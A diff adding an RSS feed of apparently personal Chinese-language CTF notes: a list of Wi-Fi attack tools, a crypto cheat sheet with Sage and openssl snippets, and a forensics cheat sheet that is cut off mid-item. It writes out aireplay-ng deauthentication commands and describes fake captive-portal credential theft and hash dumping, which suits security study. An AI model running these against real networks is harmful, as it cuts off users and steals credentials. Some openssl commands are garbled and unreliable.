@@ -1,0 +1,999 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SBK Hugo Site</title><link>https://bernie6401.github.io/docs/tools/ctf/</link><description>Recent content on SBK Hugo Site</description><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/docs/tools/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title/><link>https://bernie6401.github.io/docs/tools/ctf/all-pentest-tools/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/ctf/all-pentest-tools/</guid><description>&lt;h1 id="all-pentest-tools">
+ All Pentest Tools
+ &lt;a class="anchor" href="#all-pentest-tools">#&lt;/a>
+&lt;/h1>
+&lt;p>可以參考以下論文，裡面有詳細說明Vulnerability Assessment and Penetration Testing (VAPT)會使用到的工具有哪些
+:::info
+Ravindran, U., &amp;amp; Potukuchi, R. V. (2022). A Review on Web Application Vulnerability Assessment and Penetration Testing. Review of Computer Engineering Studies, 9(1).
+:::&lt;/p>
+&lt;h1 id="wireless-related">
+ Wireless Related
+ &lt;a class="anchor" href="#wireless-related">#&lt;/a>
+&lt;/h1>
+&lt;ul>
+&lt;li>大部分都會用到&lt;a href="https://sectools.tw/aircrack-ng-%E6%95%99%E5%AD%B8/">Aircrack&lt;/a>這個工具&lt;/li>
+&lt;li>Deauthentication - &lt;a href="http://atic-tw.blogspot.com/2014/01/airodump-ng.html">airodump-ng教學&lt;/a> / &lt;a href="http://atic-tw.blogspot.com/2014/01/aireplay-ng6.html">aireplay-ng教學&lt;/a>
+攻擊說明: &lt;a href="https://ithelp.ithome.com.tw/articles/10218551?sc=rss.iron">[Day 05]資安百物語：第二談：現代飛頭蠻的反制法-反無人機技術(下) &lt;/a>
+&lt;ol>
+&lt;li>Scan
+將掃描範圍縮小到一個目標，並取得連接到目標網路的裝置的MAC位址。
+&lt;pre tabindex="0">&lt;code>$ airodump-ng -bSSID &amp;lt;bssid&amp;gt; --ch &amp;lt;channels&amp;gt; WLAN0mon
+# 此命令用於通過識別 BSSID（基本服務集識別符）和所使用的通道來設置目標網路上的掃描
+# -c: 指定只接收特定的 channels，如果有多個 channel，用 , 分隔，例如：-c 6,8,10,11
+&lt;/code>&lt;/pre>&lt;/li>
+&lt;li>Attack
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ aireplay-ng --deauth &amp;lt;count, e.g. 1000&amp;gt; -a &amp;lt;bssid, e.g. 6A:BF:C4:06:35:94&amp;gt; -c &amp;lt;AP MAC address, e.g 34:CF:F6:96:72:E2&amp;gt; wlan0mon
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -c dmac : 指定 Client 的 MAC address&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -a bssid : 指定 AP 的 MAC address&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># --deauth: count 是指執行阻斷的次數，如果設為 0 表循環攻擊，Client 將無法上網。&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;li>Fluxion
+攻擊說明與工具教學: &lt;a href="https://www.cnblogs.com/xuanhun/p/5783836.html">實戰-Fluxion與wifi熱點偽造、釣魚、中間人攻擊、wifi破解&lt;/a>，Fluxion 攻擊的主要目標是獲取目標 Wi-Fi 網路使用者使用的密碼或訪問憑據。此攻擊可使攻擊者未經授權訪問目標網路，而有關於Captive Portal(WEB Portal)的驗證流程可以參考&lt;a href="https://ithelp.ithome.com.tw/articles/10280421">這篇&lt;/a>
+&lt;ol>
+&lt;li>Captive Portal Attack
+根據前面的background可以知道web portal的驗證流程，那如果把原本的hotspot換成一個假的hotspot，讓使用者誤以為這是真的驗證頁面(需要帳號密碼之類的)，那我們就有機會拿到credentials session&lt;/li>
+&lt;li>直接取得SSID/BSSID/Channel Used/Password Used/Type of Security Applied&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;li>MITM - &lt;a href="https://blog.csdn.net/chinabyxl/article/details/121463891">Xerosploit教學&lt;/a>
+Sniff模組允許攻擊者監控通過目標Wi-Fi網路的數據流量，包括使用者發送的數據。通過監視此類流量，攻擊者可以竊取身份驗證憑據、個人資訊或其他敏感數據等資訊，sniff完了以後可以用wireshark打開看流量&lt;/li>
+&lt;li>WEP/WPA Attack
+WEP/WPA 注入攻擊是針對使用 WEP/WPA 安全協定的無線網路的針對性攻擊。此攻擊旨在滲透網路安全並獲得對透過網路傳輸的資料流量的未經授權的存取。一旦收集到加密的流量數據，攻擊者就可以分析該數據的模式和結構，以識別網路中使用的加密金鑰。透過取得加密金鑰，攻擊者可以破解透過網路發送的資料流量的加密。
+&lt;ol>
+&lt;li>Handshake on the target Wi-Fi network&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;li>DoS - Aircrack的Wi-Fi DoS攻擊&lt;/li>
+&lt;/ul>
+&lt;h1 id="web-related">
+ Web Related
+ &lt;a class="anchor" href="#web-related">#&lt;/a>
+&lt;/h1>
+&lt;p>以下分類是按照OWASP的Pentest框架順序分類&lt;/p></description></item><item><title>Crypto Cheat Sheet</title><link>https://bernie6401.github.io/docs/tools/ctf/crypto-cheat-sheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/ctf/crypto-cheat-sheet/</guid><description>&lt;h1 id="crypto-cheat-sheet">
+ Crypto Cheat Sheet
+ &lt;a class="anchor" href="#crypto-cheat-sheet">#&lt;/a>
+&lt;/h1>
+&lt;h2 id="online-tools---classic-crypto">
+ Online Tools - Classic Crypto
+ &lt;a class="anchor" href="#online-tools---classic-crypto">#&lt;/a>
+&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Complex&lt;/th>
+ &lt;th>Substitution Cipher&lt;/th>
+ &lt;th>Vigenère Cipher&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;a href="https://gchq.github.io/CyberChef/">CyberChef&lt;/a>&lt;/td>
+ &lt;td>&lt;a href="https://www.boxentriq.com/code-breaking/cryptogram">Substitution Cipher Solver Tool&lt;/a>&lt;/td>
+ &lt;td>Known Key &lt;/br>Python - &lt;code>pycipher&lt;/code> library&lt;/br>&lt;a href="https://planetcalc.com/2468/">online - Vigenère cipher&lt;/a>&lt;/br>CAP4&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;a href="https://quipqiup.com/">quipqiup&lt;/a>&lt;/td>
+ &lt;td>&lt;/td>
+ &lt;td>Unknown Key&lt;/br>&lt;a href="https://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx">Vigenère Cipher Codebreaker&lt;/a>&lt;/br>&lt;a href="https://www.guballa.de/vigenere-solver">Vigenere Solver&lt;/a>&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;h2 id="rsa相關攻擊">
+ RSA相關攻擊
+ &lt;a class="anchor" href="#rsa%e7%9b%b8%e9%97%9c%e6%94%bb%e6%93%8a">#&lt;/a>
+&lt;/h2>
+&lt;p>其實整裡的文章內容都差不多&lt;/p>
+&lt;ul>
+&lt;li>&lt;a href="https://www.anquanke.com/post/id/84632">【技術分享】CTF中RSA的常見攻擊方法&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_module_attack/">Mod相關攻擊&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://zhuanlan.zhihu.com/p/76228394">CTF RSA&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h2 id="coding-tools">
+ Coding Tools
+ &lt;a class="anchor" href="#coding-tools">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>大數運算: &lt;a href="https://blog.csdn.net/m0_52842062/article/details/117852175">gmpy2&lt;/a>/&lt;a href="https://cocalc.com/features/sage">sage math online - cocalc&lt;/a>/&lt;a href="https://sagecell.sagemath.org/">sage math online - sagecell&lt;/a>/&lt;a href="https://www.wolframalpha.com/">WolframAlpha&lt;/a>:這是一個線上的搜索引擎，但凡和數學相關的都能進行運算，使用解說可以看&lt;a href="https://youtu.be/9JD3EzbAjH4?si=fmL7rOXK0u__Mf3u">這裡&lt;/a>
+&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ sudo apt install sagemath
+# or
+$ conda create --name sageenv sage=10.0 -c conda-forge -y # just only for wsl
+---
+# 想要在sage中安裝python library
+$ sage -pip install {library name}
+&lt;/code>&lt;/pre>:::spoiler To address Discrete Log Problem
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>p &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">117635180960139721127318189832610714114593440637486157582828661167364276581210599344857316369131977790468647533227778603367761815400416396281259234299247850289710613080530669849409358755399675041263469367135430665518150110493389671646158566214130516002949975036799297119111385228596853422400303735447298026283&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>q &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">163800729847029979711295941089800020300275211671661376396219775666688832353701752860857691086339595920419175562271802936423756228938551439950541873798393442729921516031775531740506399414675546114663346731428381174638773512946351966471041847661507898143967764453261943807056370639171597924004988320983393199599&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x8788542cefd7490c9282c06b8d24280d56c6706b996bdf580290cdf2cb90e45efd2ce185fc07d2b916c24b0512d38ca14de0ee608a9d6003f258859bbbed97dad15c1d07410a34fd55cd8305eb43418d38f1ca6e024725b97fd9da701a39c23fe55a13d43b4bf9a3d9ebb44d7fe67bd60beffc29ec27bb4baf05ec5b250bfa68360df0d1379c066297a7878e59d27e68cf6a0da90755450827623e54e4f3d9f280fef53c7620d58decfbd10dd64e9d1d5507b5460603c58f5be70c82e2a8e613d730a950caea4c4389c5fc0521f8207ead5fb26c04eb6d0486fd6fe8d015fdabbda00139b42163acc86ffb30c12988058c6247344c42b8f3cdc984c06f4276f8&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>g &lt;span style="color:#f92672">=&lt;/span> Mod(&lt;span style="color:#ae81ff">3&lt;/span>,p)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>m &lt;span style="color:#f92672">=&lt;/span> discrete_log(c,g)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(hex(m))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>g2 &lt;span style="color:#f92672">=&lt;/span> Mod(&lt;span style="color:#ae81ff">3&lt;/span>,q)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>m2 &lt;span style="color:#f92672">=&lt;/span> discrete_log(c,g2)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(m2)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(hex(m2)[&lt;span style="color:#ae81ff">2&lt;/span>:])
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
+&lt;li>Crypto常用library: pycryptodom
+&lt;code>$ pip install pycryptodome&lt;/code>
+:::spoiler pycryptodome generate PEM file
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; from Crypto.PublicKey import RSA
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; n &lt;span style="color:#f92672">=&lt;/span> 0xb4f98200f1309e8a486824051051ac80790f8e66dac4744e2ce5134fb432121f41c5471e3459d01e56e64befd2034c65eb300ebf0045342221bff206b6cdda7f3349c17b08563a576731f95a64e2f00af70b5cbb2f4f388d49ce82da76ca609a6ec1529f29b0fa0bedc5764b86472e2c5ac5198cedb6f5e1e8e0ca950ea11bc4cf5e5a0497db3ad96f5a745cf902d56be394a259068fe198bc9de8fe8d034a71013f46c2ac72451211eb1127286c19467eaf3a10049942d46b0f49f3c51c01c06a2f8c94416cc1aadaeb191de959f0241ce8f32575c848bd2f4f8f84dab46e2aa7ad45de1c6060fbbee9668f8e9cb6d366b8cd6ce99f78bbef145f2b7b7e5222f762ccb95f17b1538260c2ea45571061b0d873fbe60d61dd87aa4833ac71b802f2b91d30f38e30ae9da39fbd1c53e80496f511521285b3bb1da3dc79931463d278d1fe28a77880a9f2368029c4cefffebbbd6904f85291b3606d0b5ed3efd8c1ee14538dc051274665f4b0f55d6c6e12d2cb728ac15f7a6572b71a5bd6fa01bddb0af211091bff4c8ec7e93efae4654b2abae09e35be29afbfc3f4df8e4348c525b9d8662a1ac344dadb15b953905f639b48fec7cfcfdf27cc0ad82b936d5efe7c0d891bf9752d3fb0857d38337df033e4b681d19ec8603535504d05a421036c077694482eee919a44b3296e2a4c272cbf7bbf14b6d62eb194e4ee83ba227fed
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; e &lt;span style="color:#f92672">=&lt;/span> 0x10001
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; d &lt;span style="color:#f92672">=&lt;/span> 0x737efcd1df1b7942a53d1927c62769a0c022066e6bd58ea8498c948b7c63ac1f18996f6ebe584732e5a0a9fbce9ade49f913bd857605b464c80738cdc22293fc33de314574a79b2a26a8c50b447174627b115c47f5c46841fb45794b351ea91245f6c8e4dcf59e4eb89b1988cf9463ca58cf8b23de9db2444f9c0e8d9c3d837c521f53f1b47c6c0d523c7720d2a655503a78a4378eb18a773080d2ae898dfd172b8597822c0ded38c008b5f4b89e6c6f09f0886caa92a90ce99a6346d897ac2281620124a8b060d4ca4bd9c6b622f8d8033f43d5b75a6fd994f50091f805c87d1e6fbdb42785f6bf1332df8a64a86d21736023720b9303b964b62a9a9480a4a7ab5fac794f583109d5663998ccc893590ebe26ae076e17c2b93c2238106612094fd4c6a56ec84ca5fa6ee3608ba3422f931828772e6732c337fcd6d4e6cb4a907d2e978227423d783c112f7a7d3e6d7c91ac7c540f0095d39842a6be534321a67d7a3fcb1c62c0f9e8a6d6e10281e10ff957449770d19f939153692c73f940450eab03f58ef55d2adf98c3f8479d05bb02997667381d3583c8f0eba6ea91bce512b001a27788309a4aa15952c73572a329b2f3acd6a11f43e3ae00532ccfbe9f157702162b534d26ca1e668d4cdbfd0116b7cb724603ea99e8aa08c90410534dd681b59350542c59523cb1259428e05e1fe0aab479c4b5af2a44d18ef713cd61
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; p &lt;span style="color:#f92672">=&lt;/span> 0xd73e2ef8f2e4f1de44ee80070beef39943d4fa89a7a7ab4b0061e851aca7deb4f717f2baf4a0c018f3dcdab92148596bc50800fd6eb2f2e7757e0343534aea2241f0a2d34795a08f8e5ccc7959184b9cf8e3007a8ad63acd7d4b350dbf2d4caf04f4bc98d74a3b01d3b1aced745133186fd8460a2dff536a74ee4d041c988d5743cc9355144f48fe5f52db0449a46ba7c15c04001a5cb141796b5b42d9d72c36cca6d6bb8f177aee1699a47ba5d87c7ee886467af18403dbd84e102a952ebee03cc70bcf072c26b1b1f0f5094be08470c6c1769b417feffd5c89a0c373f75a350d177309618bfeb16316c660c6b2a341a984c8845081ede7c42e22cc9272aa15
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; q &lt;span style="color:#f92672">=&lt;/span> 0xd73e2ef8f2e4f1de44ee80070beef39943d4fa89a7a7ab4b0061e851aca7deb4f717f2baf4a0c018f3dcdab92148596bc50800fd6eb2f2e7757e0343534aea2241f0a2d34795a08f8e5ccc7959184b9cf8e3007a8ad63acd7d4b350dbf2d4caf04f4bc98d74a3b01d3b1aced745133186fd8460a2dff536a74ee4d041c988d5743cc9355144f48fe5f52db0449a46ba7c15c04001a5cb141796b5b42d9d72c36cca6d6bb8f177aee1699a47ba5d87c7ee886467af18403dbd84e102a952ebee03cc70bcf072c26b1b1f0f5094be08470c6c1769b417feffd5c89a0c373f75a350d177309618bfeb16316c660c6b2a341a984c8845081eded2ff580f9f582ac79
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; key_params &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>n, e, d, p, q&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; key &lt;span style="color:#f92672">=&lt;/span> RSA.construct&lt;span style="color:#f92672">(&lt;/span>key_params&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; f &lt;span style="color:#f92672">=&lt;/span> open&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;./rsaprivatekey.pem&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;w&amp;#39;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; f.write&lt;span style="color:#f92672">(&lt;/span>key.exportKey&lt;span style="color:#f92672">()&lt;/span>.decode&lt;span style="color:#f92672">())&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; f.close&lt;span style="color:#f92672">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
+&lt;li>&lt;a href="https://www.mkssoftware.com/docs/man1/openssl_rsa.1.asp">openssl - RSA(很清楚)&lt;/a>
+:::spoiler Cheat Sheet
+&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">&amp;#39;&amp;#39;&amp;#39;AES / DES&amp;#39;&amp;#39;&amp;#39;
+$ openssl des-ecb –e –in xxx.txt –out yyy.out –k password (DES encrypt)
+$ openssl des-ecb –d –in yyy.out –out xxx.txt –k password (DES decrypt)
+$ openssl des-ede3 –d –in yyy.out –out xxx.txt –k password (TDES encrypt)
+$ openssl aes-128-ecb –d –in yyy.out –out xxx.txt –k password (AES decrypt)
+
+&amp;#39;&amp;#39;&amp;#39;RSA&amp;#39;&amp;#39;&amp;#39;
+$ openssl genrsa –out rsa_privatekey.pem –passout pass:password –des3 1024
+# (generate RSA private key)
+$ openssl rsa –in rsa_privatekey.pem –passin pass:password –pubout –out
+rsa_publickey.pem (generate RSA public key)
+$ openssl rsautl –encrypt –pubin –inkey rsa_publickey.pem –in xxx.txt –out yyy.txt
+# (use public key to encrpt)
+$ openssl rsaut –decrypt –ik i k n ey rsa_privatekey.pem –in yyy.txt –out xxx.txt
+
+# To print out the components of a private key to standard output
+$ openssl rsa -in key.pem -text -noout
+
+# 把certificate轉成pem file
+$ openssl openssl x509 -in cert -pubkey -noout
+-----BEGIN PUBLIC KEY-----
+MCIwDQYJKoZIhvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQAB
+-----END PUBLIC KEY-----
+
+# 把單純public key的內容(n, e)(就是上面的東西)印出來
+$ openssl rsa -pubin -in public.pem -text
+RSA Public-Key: (53 bit)
+Modulus: 4966306421059967 (0x11a4d45212b17f)
+Exponent: 65537 (0x10001)
+writing RSA key
+-----BEGIN PUBLIC KEY-----
+MCIwDQYJKoZIhvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQAB
+-----END PUBLIC KEY-----
+
+// 產出私鑰
+openssl genrsa -out key.pem 2048
+
+// 用同一把私鑰，產出兩組不同的憑證
+openssl req -x509 -new -key key.pem -sha256 -nodes -keyout key.pem -out cert1.pem -days 30
+openssl req -x509 -new -key key.pem -sha256 -nodes -keyout key.pem -out cert2.pem -days 30
+
+// 顯示公鑰是一樣
+openssl x509 -pubkey -noout -in cert1.pem
+openssl x509 -pubkey -noout -in cert2.pem
+
+// 顯示憑證內容是不一樣
+openssl x509 -inform pem -in cert2.pem
+openssl x509 -inform pem -in cert1.pem
+&lt;/code>&lt;/pre>:::&lt;/li>
+&lt;/ul>
+&lt;h2 id="factoring-tools">
+ Factoring Tools
+ &lt;a class="anchor" href="#factoring-tools">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>&lt;a href="http://factordb.com/index.php">Factor DB&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/DarkenCode/yafu">Yafu&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.alpertron.com/ECM.HTM">Prime Factorization Online&lt;/a>&lt;/li>
+&lt;/ul></description></item><item><title>Forensics Cheat Sheet</title><link>https://bernie6401.github.io/docs/tools/ctf/forensics-cheat-sheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/ctf/forensics-cheat-sheet/</guid><description>&lt;h1 id="forensics-cheat-sheet">
+ Forensics Cheat Sheet
+ &lt;a class="anchor" href="#forensics-cheat-sheet">#&lt;/a>
+&lt;/h1>
+&lt;h2 id="windows">
+ Windows
+ &lt;a class="anchor" href="#windows">#&lt;/a>
+&lt;/h2>
+&lt;h3 id="where">
+ Where
+ &lt;a class="anchor" href="#where">#&lt;/a>
+&lt;/h3>
+&lt;ul>
+&lt;li>SOFTWARE: &lt;code>root/Windows/System32/config/SOFTWARE&lt;/code>&lt;/li>
+&lt;li>SYSTEM: &lt;code>root/Windows/System32/config/SYSTEM&lt;/code>&lt;/li>
+&lt;li>NTUSER.DAT: &lt;code>root/Users/{username}/NTUSER.DAT&lt;/code>&lt;/li>
+&lt;li>$MFT: &lt;code>root/$MFT&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h3 id="software-information">
+ SOFTWARE Information
+ &lt;a class="anchor" href="#software-information">#&lt;/a>
+&lt;/h3>
+&lt;ul>
+&lt;li>原本電腦OS的基本資訊(Build Number/Product Name/):
+&lt;code>SOFTWARE/Microsoft/Windows NT/CurrentVersion&lt;/code>&lt;/li>
+&lt;li>檢查SID:
+&lt;code>SOFTWARE/Microsoft/Windows NT/CurrentVersion/ProfileList&lt;/code>&lt;/li>
+&lt;li>查看登入:
+&lt;code>SOFTWARE/Microsoft/Windows NT/CurrentVersion/Winlogon&lt;/code>&lt;/li>
+&lt;li>StartUp Run:
+&lt;code>SOFTWARE/Microsoft/Windows/CurrentVersion/Run&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h4 id="ntuserdat每個使用者都不一樣">
+ NTUSER.DAT(每個使用者都不一樣)
+ &lt;a class="anchor" href="#ntuserdat%e6%af%8f%e5%80%8b%e4%bd%bf%e7%94%a8%e8%80%85%e9%83%bd%e4%b8%8d%e4%b8%80%e6%a8%a3">#&lt;/a>
+&lt;/h4>
+&lt;ul>
+&lt;li>UserAssit:
+&lt;code>root/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/UserAssist&lt;/code>&lt;/li>
+&lt;li>Recent Docs:
+&lt;code>root/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/RecentDocs&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h3 id="system-information">
+ System Information
+ &lt;a class="anchor" href="#system-information">#&lt;/a>
+&lt;/h3>
+&lt;ul>
+&lt;li>電腦名稱:
+&lt;code>SYSTEM/ControlSet001/Control/ComputerName/ComputerName&lt;/code>&lt;/li>
+&lt;li>電腦IP/DHCP相關資訊:
+&lt;code>SYSTEM/ControlSet001/Services/Tcpip/Parameters/Interfaces/&lt;/code>&lt;/li>
+&lt;li>時區:
+&lt;code>SYSTEM/ControlSet001/Control/TimeZoneInformation&lt;/code>&lt;/li>
+&lt;li>USB資訊:
+&lt;code>SYSTEM/ControlSet001/Enum/USBSTOR/&lt;/code>&lt;/li>
+&lt;li>CPU架構:
+&lt;code>SYSTEM/ControlSet001/Control/Session Manager/Environment/&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h3 id="database">
+ Database
+ &lt;a class="anchor" href="#database">#&lt;/a>
+&lt;/h3>
+&lt;ul>
+&lt;li>Chrome History:
+&lt;code>./Users/{username}/AppData/Local/Google/Chrome/User Data/Default/History&lt;/code>&lt;/li>
+&lt;li>Firefox History:
+&lt;code>./Users/{username}/AppData/Roaming/Mozilla/Firefox/Profiles/{random}.default-release/places.sqlite&lt;/code>&lt;/li>
+&lt;li>Skype Chat History:
+&lt;code>./Users/{username}/AppData/Roaming/Skype/{account name}&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h3 id="taskbar">
+ Taskbar
+ &lt;a class="anchor" href="#taskbar">#&lt;/a>
+&lt;/h3>
+&lt;ul>
+&lt;li>&lt;code>./Users/{username}/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/User Pinned/TaskBar&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h2 id="mac-os">
+ mac-OS
+ &lt;a class="anchor" href="#mac-os">#&lt;/a>
+&lt;/h2>
+&lt;h3 id="plist">
+ plist
+ &lt;a class="anchor" href="#plist">#&lt;/a>
+&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo apt install libplist-utils -y
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ plistutil -i &lt;span style="color:#f92672">{&lt;/span>plist file&lt;span style="color:#f92672">}&lt;/span> -o &lt;span style="color:#f92672">{&lt;/span>output file&lt;span style="color:#f92672">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
+&lt;li>System Version:
+&lt;code>./root/System/Library/CoreServices/SystemVersion.plist&lt;/code>&lt;/li>
+&lt;li>Browser Bookmark
+&lt;code>./root/Users/{username}/Library/Safari/Bookmarks.plist&lt;/code>&lt;/li>
+&lt;li>Password information
+&lt;code>./root/private/var/db/dslocal/nodes/Default/users/{username}.plist&lt;/code>&lt;/li>
+&lt;li>The process responsible for connecting iPhones/iPads with MacOS is lockdown
+&lt;code>./root/private/var/db/dslocal/nodes/Default/users/_usbmux.plist&lt;/code>&lt;/li>
+&lt;li>Spotlight(這個不需要透過plistutil就可以直接cat)
+&lt;code>./root/Users/{username}/Library/Application Support/com.apple.spotlight/com.apple.spotlight.Shortcuts&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h3 id="event-log">
+ Event Log
+ &lt;a class="anchor" href="#event-log">#&lt;/a>
+&lt;/h3>
+&lt;ul>
+&lt;li>短期檔案系統變更儲存在&lt;code>.fseventsd&lt;/code>中，必須使用&lt;code>mac_apt&lt;/code>這個工具幫忙parse(FSEVENTS)
+&lt;code>./root/.fseventsd/&lt;/code>&lt;/li>
+&lt;li>ScreenTime: 一樣要透過&lt;code>mac_apt&lt;/code>幫忙parse(SCREENTIME)，記得要把&lt;code>RMAdminStore-Local.sqlite-wal&lt;/code>這個檔案和&lt;code>RMAdminStore-Local.sqlite&lt;/code>放在一起執行
+&lt;code>./root/private/var/folders/bf/{random strings}/0/com.apple.ScreenTimeAgent/Store/RMAdminStore-Local.sqlite&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h3 id="database-1">
+ Database
+ &lt;a class="anchor" href="#database-1">#&lt;/a>
+&lt;/h3>
+&lt;ul>
+&lt;li>Note
+&lt;code>./root/Users/{username}/Library/Group Containers/group.com.apple.notes&lt;/code>&lt;/li>
+&lt;li>Quarantined Events
+&lt;code>./root/Users/{username}/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2&lt;/code>&lt;/li>
+&lt;li>Messages
+&lt;code>./root/Users/{username}/Library/Messages/chat.db&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h2 id="volatilitys">
+ Volatilitys
+ &lt;a class="anchor" href="#volatilitys">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>&lt;a href="https://hackmd.io/@TuX-/BymMpKd0s">主要的CheatSheet&lt;/a>&lt;/li>
+&lt;li>ldrmodules: 更進階的dlllist，可以顯示被隱藏的dll，以及dll的狀態
+&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} ldrmodules --pid {pid}&lt;/code>&lt;/li>
+&lt;li>如果要dump被injected過的process:
+&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} malfind --pid {pid} --dump-dir={output folder}&lt;/code>&lt;/li>
+&lt;li>dump hash
+&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} hashdump &amp;gt; ntlm.hash&lt;/code>&lt;/li>
+&lt;li>如果是要找到某個東西的timestamp，可以考慮直接用timeliner這個plubin，主要的功能是就是建立記憶體中的各種痕跡資訊的時間線
